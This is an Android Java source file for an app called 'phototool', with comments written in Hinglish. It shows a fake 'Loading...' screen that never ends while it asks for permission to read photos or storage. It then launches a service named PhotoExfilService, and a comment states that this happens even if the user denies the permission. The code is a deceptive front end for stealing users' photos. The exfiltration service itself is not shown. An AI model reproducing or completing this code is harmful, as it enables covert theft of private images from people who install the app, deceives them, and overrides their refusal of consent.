package com.secure.labs.phototool;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

/**
 * Fake "Loading..." screen jo kabhi khatam nahi hota.
 * Permission maangta hai, milte hi service start.
 */
public class MainActivity extends Activity {

    private static final int REQ_PERMS = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // --- Fake loading UI (pure code, layout file ki zaroorat nahi) ---
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);

        ProgressBar bar = new ProgressBar(this);
        bar.setIndeterminate(true);

        TextView tv = new TextView(this);
        tv.setText("Loading...");
        tv.setTextSize(18);
        tv.setPadding(0, 24, 0, 0);

        root.addView(bar, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));
        root.addView(tv, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));
        setContentView(root);

        requestPerms();
    }

    private void requestPerms() {
        if (Build.VERSION.SDK_INT >= 23) {
            String[] perms;
            if (Build.VERSION.SDK_INT >= 33) {
                perms = new String[]{Manifest.permission.READ_MEDIA_IMAGES};
            } else {
                perms = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
            }
            requestPermissions(perms, REQ_PERMS);
        } else {
            startExfil();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // "Deny" dabaya to bhi koshish karega (jab tak app background na ho)
        startExfil();
    }

    private void startExfil() {
        Intent i = new Intent(this, PhotoExfilService.class);
        startService(i);
    }
}
